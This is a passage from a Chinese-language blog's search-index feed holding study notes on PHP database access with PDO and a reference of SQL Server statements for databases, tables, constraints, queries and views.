class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">        <span class="variable">$database</span> = <span class="string">&quot;mysystem&quot;</span>;</span><br><span class="line">        <span class="variable">$db_username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="variable">$db_password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=$&#123;ip&#125;;dbname=$&#123;database&#125;&quot;</span>;</span><br><span class="line">        <span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="variable">$db_username</span>,<span class="variable">$db_password</span>);</span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>); <span class="comment">//设置字符编码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>( PDOException <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.数据库操作</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE username = :username &quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span> &gt; <span class="number">0</span>) &#123;<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">&#x27;error!&#x27;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 6.直接显示后续页面或返回页面（返回的页面可用于AJAX请求操作）</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;count&quot;</span> =&gt; <span class="variable">$count</span>, <span class="string">&quot;rows&quot;</span> =&gt; <span class="variable">$rows</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="五、PHP技巧"><a href="#五、PHP技巧" class="headerlink" title="五、PHP技巧"></a>五、PHP技巧</h2><ul><li>显示中文<ol><li><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</code></li><li><code>`&lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); ?&gt;</code></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL语句</title>
      <link href="/posts/b51e1490.html"/>
      <url>/posts/b51e1490.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h1><blockquote><p><a href="https://zhuanlan.zhihu.com/p/101220569">查询、视图和游标</a></p><p><a href=".\a0eceee2">text::Transact——SQL</a> </p><p>单行注释：<code>--</code>（<code>--</code> 后面有空格，所以sql注入是 <code>--+</code> ）</p><p>多行注释：<code>/**/</code></p></blockquote><hr><h2 id="一、数据库"><a href="#一、数据库" class="headerlink" title="一、数据库"></a>一、数据库</h2><blockquote><p>下面指的是SQL Server数据库。</p></blockquote><h3 id="1-数据库结构"><a href="#1-数据库结构" class="headerlink" title="1 数据库结构"></a>1 数据库结构</h3><blockquote><p>数据文件</p><p>日志文件</p><p>文件组：</p><ul><li>一个数据文件只能存在于一个文件组中，一个文件组也只能被一个数据库使用。</li></ul></blockquote><h3 id="2-系统数据库"><a href="#2-系统数据库" class="headerlink" title="2 系统数据库"></a>2 系统数据库</h3><blockquote><p>master数据库：核心数据库，记录所有系统级信息。包括实例范围的元数据（例如登入账户）、端点、连接服务器和系统配置信息。</p><p>model数据库：所有用户数据库的创建模板，必须始终存在于Microsoft SQL Server系统中。</p><p>msdb数据库：SQL Server Agent使用msdb数据库来计划和警报作业</p><p>tempdb数据库：用作系统的临时存储。每次重启时SQL Server都会重新创建tempdb数据库，从而获得一个干净的数据库副本。</p><p>resource数据库（只读和隐藏的数据库）：包含Microsoft SQL Server中的所有系统对象。</p></blockquote><h3 id="3-创建"><a href="#3-创建" class="headerlink" title="3 创建"></a>3 创建</h3><p>界面</p><blockquote><p>右键数据库创建——修改数值</p></blockquote><p>SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> database 库名</span><br><span class="line">[ <span class="keyword">on</span></span><br><span class="line">[ filegroup 文件组名]</span><br><span class="line">(name <span class="operator">=</span> 逻辑名,</span><br><span class="line">  filename <span class="operator">=</span> <span class="string">&#x27;路径+文件名&#x27;</span>,  <span class="comment">--主库.mdf  次库.ndf</span></span><br><span class="line">  size <span class="operator">=</span> 初始大小,</span><br><span class="line">  maxsize <span class="operator">=</span> 最大大小,</span><br><span class="line">  filegrowth <span class="operator">=</span> 自动增长,)]</span><br><span class="line">  </span><br><span class="line">[ log <span class="keyword">on</span></span><br><span class="line">[ filegroup 文件组名]</span><br><span class="line">(name <span class="operator">=</span> 逻辑名,</span><br><span class="line">  filename <span class="operator">=</span> <span class="string">&#x27;路径+文件名&#x27;</span>,  <span class="comment">--日志.ldf</span></span><br><span class="line">  size <span class="operator">=</span> 初始大小,</span><br><span class="line">  maxsize <span class="operator">=</span> 最大大小,</span><br><span class="line">  filegrowth <span class="operator">=</span> 自动增长,)]</span><br><span class="line">[<span class="keyword">collate</span> 数据库校验方式名称]</span><br><span class="line">[<span class="keyword">for</span> attach]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- []语句表示可以选用或不选用</span></span><br><span class="line"><span class="comment">-- ()语句表示除最后一行外其余命令用 , 隔开</span></span><br><span class="line"><span class="comment">-- 数据库校验可以选择：Windows校验方式，SQL校验方式</span></span><br><span class="line"><span class="comment">-- for attach 表示将已经存在的数据库文件附加到新的数据库中</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="4-修改"><a href="#4-修改" class="headerlink" title="4 修改"></a>4 修改</h3><p>界面</p><blockquote><p>右键数据库属性</p></blockquote><p>SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> database 数据库名称</span><br><span class="line"><span class="keyword">add</span> file(具体文件格式) <span class="comment">-- 向数据库中添加数据文件</span></span><br><span class="line">  [ ,...n ]</span><br><span class="line">  [ <span class="keyword">to</span> filegroup 文件组名]</span><br><span class="line">  </span><br><span class="line"><span class="keyword">add</span> log file(具体文件格式) <span class="comment">-- 向数据库中添加日志文件</span></span><br><span class="line">  [ ,...n ]</span><br><span class="line">  </span><br><span class="line">  <span class="operator">|</span> remove file 文件逻辑名称 <span class="comment">-- 从数据库中删除文件，并删除物理文件。如果文件不为空则无法删除。</span></span><br><span class="line">  <span class="operator">|</span> modify file(具体文件格式)  <span class="comment">-- 修改文件</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">add</span> filegroup 文件组名 <span class="comment">-- 向数据库中添加文件组</span></span><br><span class="line">  <span class="operator">|</span> remove filegroup 文件组名 <span class="comment">-- 从数据库中删除文件组。若文件组非空需要先删除文件组中所有文件</span></span><br><span class="line">  <span class="operator">|</span> modify filegroup 文件组名 <span class="comment">-- 修改文件组名称、设置文件组read_only（只读） | read_write（读写），指定文件组为default（默认文件组）</span></span><br><span class="line">  &#123;</span><br><span class="line">  read_only <span class="operator">|</span> read_write ,</span><br><span class="line">      <span class="operator">|</span> <span class="keyword">default</span> ,</span><br><span class="line">      <span class="operator">|</span>  name <span class="operator">=</span> 新文件组名 &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 具体文件格式：</span></span><br><span class="line">(</span><br><span class="line">    name <span class="operator">=</span> 文件逻辑名称</span><br><span class="line">    [ , newname <span class="operator">=</span> 新文件逻辑名称 ]</span><br><span class="line">    [ , size <span class="operator">=</span> 初始文件大小 ]</span><br><span class="line">    [ , maxsize <span class="operator">=</span> 文件最大容量 ]</span><br><span class="line">    [ , filegrowth <span class="operator">=</span> 文件自动增长容量]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="5-删除"><a href="#5-删除" class="headerlink" title="5 删除"></a>5 删除</h3><p>界面</p><blockquote><p>右键数据库删除。</p></blockquote><p>SQL语句</p><blockquote><p>drop database 数据库名称 [,…n]</p></blockquote><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="6-查看"><a href="#6-查看" class="headerlink" title="6 查看"></a>6 查看</h3><p>界面</p><blockquote><p>右键数据库属性。</p></blockquote><p>SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看数据库结构（不指定显示全部）</span></span><br><span class="line"><span class="keyword">exec</span> Sp_helpdb [[<span class="variable">@dbname</span><span class="operator">=</span>] <span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="comment">-- 查看文件信息（不指定显示全部）</span></span><br><span class="line"><span class="keyword">exec</span> Sp_helpfile [[<span class="variable">@filename</span><span class="operator">=</span>] <span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="comment">-- 查看文件组名称（不指定显示全部）</span></span><br><span class="line"><span class="keyword">exec</span> Sp_helpfilegroup [[<span class="variable">@filegroupname</span><span class="operator">=</span>] <span class="string">&#x27;name&#x27;</span>]</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="7-迁移"><a href="#7-迁移" class="headerlink" title="7 迁移"></a>7 迁移</h3><p>界面</p><blockquote><p>分离：右键数据库——任务——分离</p><p>加载：右键数据库——附加</p></blockquote><hr><h2 id="二、数据表"><a href="#二、数据表" class="headerlink" title="二、数据表"></a>二、数据表</h2><h3 id="1-创建"><a href="#1-创建" class="headerlink" title="1 创建"></a>1 创建</h3><p><a href="https://www.runoob.com/sql/sql-datatypes-general.html">数据类型</a> （下面为补充类型）</p><div class="table-container"><table><thead><tr><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>nchar，nvarchar，ntext</td><td>Unicode字符</td></tr><tr><td>text / ntext</td><td>文本字符型，最大存 2 ^ 31 - 1 / 2 ^ 30 -1 个字符</td></tr><tr><td>money / smallmoney</td><td>货币型，可精确到小数点后四位</td></tr><tr><td>auto_increment</td><td>自动递增，可以自动递增或随机产生一个整数，常用来自动产生唯一编号</td></tr></tbody></table></div><p>创建数据表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> ( <span class="operator">&lt;</span>列定义<span class="operator">&gt;</span> [ &#123; , <span class="operator">&lt;</span>列定义<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>表约束<span class="operator">&gt;</span> &#125; ] )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- &lt;列定义&gt;： &lt;列名&gt; &lt;数据类型&gt; [ default ] [ &#123;列约束&#125; ]</span></span><br></pre></td></tr></table></figure><p>数据表约束</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建约束</span></span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] <span class="operator">&lt;</span> 约束类型 <span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 允许/不允许为空（缺省值为 NULL） </span></span><br><span class="line"><span class="keyword">NULL</span> <span class="operator">/</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] [ <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> ]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 唯一约束（表明某列值必须唯一，允许NULL）</span></span><br><span class="line"><span class="keyword">unique</span> </span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] [ <span class="keyword">unique</span> ]</span><br><span class="line"><span class="comment">-- unique会强制在指定字段上创造一个unique索引，缺省为非聚集索引。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 主键（唯一标识，不允许NULL）</span></span><br><span class="line"><span class="keyword">primary</span> key</span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] <span class="keyword">primary</span> key ( <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> [ &#123; , <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> &#125; ] )</span><br><span class="line"><span class="comment">-- 一个表只能一个主键（但是可以联合多个列）</span></span><br><span class="line"><span class="comment">-- 定义了primary key的列不能定义unique。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 外键（联立从表主键）</span></span><br><span class="line"><span class="keyword">foreign</span> key</span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] <span class="keyword">foreign</span> key [ <span class="keyword">references</span> <span class="operator">&lt;</span> 主表名 <span class="operator">&gt;</span> ] ( <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> [ &#123; , <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> &#125; ] )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 约束（检查条件）</span></span><br><span class="line"><span class="keyword">check</span></span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] <span class="keyword">check</span> ( <span class="operator">&lt;</span> 条件 <span class="operator">&gt;</span> )</span><br></pre></td></tr></table></figure><p>特殊使用</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看全部约束</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sys.objects</span><br><span class="line"><span class="keyword">where</span> type <span class="keyword">in</span> ( <span class="string">&#x27;c&#x27;</span> , <span class="string">&#x27;d&#x27;</span> , <span class="string">&#x27;f&#x27;</span> , <span class="string">&#x27;pk&#x27;</span> , <span class="string">&#x27;uq&#x27;</span>)</span><br><span class="line"><span class="comment">-- in中分别为：check,default,foreign key,primary key,unique。</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwd</span><br><span class="line">(</span><br><span class="line">    id <span class="type">integer</span> <span class="keyword">primary</span> key autoincrement,</span><br><span class="line">    name nvarchar(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">user</span> nvarchar(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    pwd nvarchar(<span class="number">33</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    text nvarchar(<span class="number">40</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="2-修改"><a href="#2-修改" class="headerlink" title="2 修改"></a>2 修改</h3><p>表格式修改</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 增加列或列约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> </span><br><span class="line"><span class="keyword">add</span> <span class="operator">&lt;</span>列定义<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>完整性约束定义<span class="operator">&gt;</span> </span><br><span class="line"># <span class="operator">&lt;</span>完整性约束定义<span class="operator">&gt;</span> ：<span class="keyword">constraint</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span> <span class="operator">&lt;</span>约束<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改列</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="operator">&lt;</span> 表名 <span class="operator">&gt;</span> </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">column</span> <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> <span class="operator">&lt;</span> 数据类型 <span class="operator">&gt;</span> [ <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> ]</span><br><span class="line"># 注：（不能改列名，不能改类型，不能减少宽度，不能<span class="keyword">null</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">not</span> <span class="keyword">null</span>，有其他约束应该先删其他约束）</span><br></pre></td></tr></table></figure><p>表数据修改</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 插入数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> [(<span class="operator">&lt;</span>列名<span class="number">1</span><span class="operator">&gt;</span>[,<span class="operator">&lt;</span>列名<span class="number">2</span><span class="operator">&gt;</span>...])] # （插入写列名则插入对应列，不写则插入数据要含有全部的列）</span><br><span class="line"><span class="keyword">values</span> (<span class="operator">&lt;</span>值<span class="operator">&gt;</span>) [,(<span class="operator">&lt;</span>值<span class="operator">&gt;</span>)] # （插入一行或多行的值）</span><br><span class="line"># 多行插入：子查询，<span class="keyword">values</span>带多个值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改数据</span></span><br><span class="line"><span class="keyword">update</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">set</span> <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">=</span> <span class="operator">&lt;</span>表达式<span class="operator">&gt;</span> [,<span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">=</span> <span class="operator">&lt;</span>表达式<span class="operator">&gt;</span>]...</span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>]</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="3-删除"><a href="#3-删除" class="headerlink" title="3 删除"></a>3 删除</h3><p>删除数据表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除列或约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">constraint</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span> <span class="operator">|</span> <span class="keyword">drop</span> <span class="keyword">column</span> <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除表</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>删除数据表数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 删除数据</span></span><br><span class="line"><span class="keyword">delete</span></span><br><span class="line"><span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>]</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">..</span><br></pre></td></tr></table></figure><h3 id="4-查看"><a href="#4-查看" class="headerlink" title="4 查看"></a>4 查看</h3><blockquote><p>查数据表格式：右键属性。</p><p>查数据表数据：单表查询、多表查询。</p></blockquote><h4 id="4-1-select-单表查询"><a href="#4-1-select-单表查询" class="headerlink" title="4.1 select 单表查询"></a>4.1 select 单表查询</h4><blockquote><p>比较运算符：等于(=)、不等于(&lt;&gt;)、大于(&gt;)、小于(&lt;)、大于等于(&gt;=)、小于等于(&lt;=)</p><p>统计函数：</p><ul><li>统计结果无列名，可以用as取别名。</li><li><code>count(distinct)</code>可以消除重复行取和，count对空值不计算，对0计算。</li><li><code>(count *)</code>不消除重复行，不可以用distinct。</li></ul></blockquote><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>like</td><td>类似（like是模糊信息，=是确定信息）</td></tr><tr><td>is null</td><td>判断空（不能用=null）</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>通配符</th><th>作用</th></tr></thead><tbody><tr><td>%</td><td>多个字符</td></tr><tr><td>_</td><td>一个字符</td></tr><tr><td>[ 0~9 ]</td><td>在0~9中的字符</td></tr><tr><td>[ ^3~7 ]</td><td>不在3~7中的字符</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>avg</td><td>平均数</td></tr><tr><td>sum</td><td>总数</td></tr><tr><td>max</td><td>最大值</td></tr><tr><td>min</td><td>最小值</td></tr><tr><td>count</td><td>总个数</td></tr></tbody></table></div><p>单表查询</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> [ <span class="keyword">all</span> <span class="operator">|</span> <span class="keyword">distinct</span> ] [ TOP N [ <span class="keyword">percent</span> ] [ <span class="keyword">with</span> ties ] ]</span><br><span class="line"><span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> [ <span class="keyword">as</span> 别名<span class="number">1</span> ] [ &#123; <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> [ <span class="keyword">as</span> 别名<span class="number">2</span> ] &#125;]</span><br><span class="line"><span class="keyword">from</span> <span class="operator">&lt;</span> 表名 <span class="operator">&gt;</span> [ [ <span class="keyword">as</span> ] 表别名 ]</span><br><span class="line">[ <span class="keyword">where</span> <span class="operator">&lt;</span> 检索条件 <span class="operator">&gt;</span>]</span><br><span class="line">[ <span class="keyword">group</span> <span class="keyword">by</span> <span class="operator">&lt;</span> 列名<span class="number">1</span> <span class="operator">&gt;</span> [ <span class="keyword">having</span> <span class="operator">&lt;</span> 条件表达式 <span class="operator">&gt;</span> ] ]</span><br><span class="line">[ <span class="keyword">order</span> <span class="keyword">by</span> <span class="operator">&lt;</span>列名<span class="number">2</span> <span class="operator">&gt;</span> [ <span class="keyword">asc</span> <span class="operator">|</span> <span class="keyword">desc</span> ] ]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- \* ：全部列名。</span></span><br><span class="line"><span class="comment">-- distinct ：去重查询。（需要元组重复才会去重）</span></span><br><span class="line"></span><br><span class="line"># 按照什么值分组</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">having</span> # 分组后按照一定条件筛选。</span><br><span class="line"></span><br><span class="line"># 按照什么排序</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">asc</span><span class="operator">|</span><span class="keyword">desc</span> # 默认升序，（升序 <span class="operator">|</span> 降序）</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####   <span class="number">4.2</span> <span class="keyword">select</span> 多表查询</span><br><span class="line"></span><br><span class="line">  <span class="operator">&gt;</span> 查询格式同上</span><br><span class="line">  <span class="operator">&gt;</span></span><br><span class="line">  <span class="operator">&gt;</span> 内连接查询：不符合结果则不输出，表间用 , 隔开是内连接。`<span class="keyword">inner</span> <span class="keyword">join</span>`</span><br><span class="line">  <span class="operator">&gt;</span></span><br><span class="line">  <span class="operator">&gt;</span> 外连接查询：不符合结果输出空。外连接查询<span class="keyword">where</span>改成<span class="keyword">on</span>。</span><br><span class="line">  <span class="operator">&gt;</span></span><br><span class="line">  <span class="operator">&gt;</span> [外连接查询](https:<span class="operator">/</span><span class="operator">/</span>www.cnblogs.com<span class="operator">/</span>menghen<span class="operator">/</span>p<span class="operator">/</span><span class="number">12569473.</span>html)    [外连接查询图解](https:<span class="operator">/</span><span class="operator">/</span>www.zhihu.com<span class="operator">/</span>question<span class="operator">/</span><span class="number">34559578</span><span class="operator">/</span>answer<span class="operator">/</span><span class="number">2561071157</span>)</span><br><span class="line"></span><br><span class="line">  <span class="operator">|</span> 语句                 <span class="operator">|</span> 作用                     <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span> <span class="comment">-------------------- | ------------------------ |</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">left</span> ( <span class="keyword">outer</span> ) <span class="keyword">join</span>  <span class="operator">|</span> 左边表全，右边缺用<span class="keyword">null</span>补 <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">right</span> ( <span class="keyword">outer</span> ) <span class="keyword">join</span> <span class="operator">|</span> 右边表全，左边缺用<span class="keyword">null</span>补 <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">full</span> ( <span class="keyword">outer</span> ) <span class="keyword">join</span>  <span class="operator">|</span> 左右表的并集             <span class="operator">|</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">cross</span> <span class="keyword">join</span>           <span class="operator">|</span> 笛卡尔连接               <span class="operator">|</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">自连接查询</span><br><span class="line"></span><br><span class="line"><span class="operator">&gt;</span> 取别名，自己查自己，输出需要的数据。</span><br><span class="line"></span><br><span class="line">```<span class="keyword">sql</span></span><br><span class="line"><span class="comment">-- 例：输出薪水大于刘伟的人的薪水</span></span><br><span class="line"><span class="keyword">select</span> x.sal</span><br><span class="line"><span class="keyword">from</span> t <span class="keyword">as</span> x, t <span class="keyword">as</span> y</span><br><span class="line"><span class="keyword">where</span> x.sal <span class="operator">&gt;</span> y.sal <span class="keyword">and</span> y.tn <span class="operator">=</span> <span class="string">&#x27;刘伟&#x27;</span></span><br></pre></td></tr></table></figure><p>子查询</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 任意（可用 in 代替）</span></span><br><span class="line"><span class="keyword">any</span></span><br><span class="line"><span class="comment">-- 所有</span></span><br><span class="line"><span class="keyword">all</span></span><br><span class="line"><span class="comment">-- （不）存在</span></span><br><span class="line">[<span class="keyword">not</span>] <span class="keyword">exists</span></span><br><span class="line"><span class="comment">-- 联合查询（输出一个结果集，需要同结构的表，会自动去重）</span></span><br><span class="line"><span class="keyword">union</span> </span><br></pre></td></tr></table></figure><p>其他</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 把查询结果输入到一个表中</span></span><br><span class="line"><span class="keyword">select</span> ... <span class="keyword">into</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><hr><h2 id="三、视图"><a href="#三、视图" class="headerlink" title="三、视图"></a>三、视图</h2><h3 id="1-创建视图"><a href="#1-创建视图" class="headerlink" title="1 创建视图"></a>1 创建视图</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> view_name [(<span class="keyword">column</span> [ , ... n ])]</span><br><span class="line">[<span class="keyword">with</span> <span class="operator">&lt;</span>view_attribute<span class="operator">&gt;</span> [, ... n ]]</span><br><span class="line"><span class="keyword">as</span> select_statement</span><br><span class="line">[<span class="keyword">with</span> <span class="keyword">check</span> option] [;]  <span class="comment">-- 修改视图需要符合以下语句</span></span><br><span class="line"><span class="operator">&lt;</span> view_attribute <span class="operator">&gt;</span> ::<span class="operator">=</span></span><br><span class="line">&#123;</span><br><span class="line">    [ encryption ]</span><br><span class="line">    [ schemabinding ]</span><br><span class="line">    [ view_metadate ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- [( column [, ... n])]  -- 列是算术表达式，函数，常量派生才需要列名。</span></span><br><span class="line"><span class="comment">-- [ with check option ] [;]  -- 修改视图需要符合以下语句。</span></span><br><span class="line"><span class="comment">-- [ encryption ]  -- 加密后无法修改视图。</span></span><br><span class="line"><span class="comment">-- [ schemabinding ]  -- 绑定框架，不能随便更改框架。</span></span><br><span class="line"><span class="comment">-- [ view_metadate ]  -- 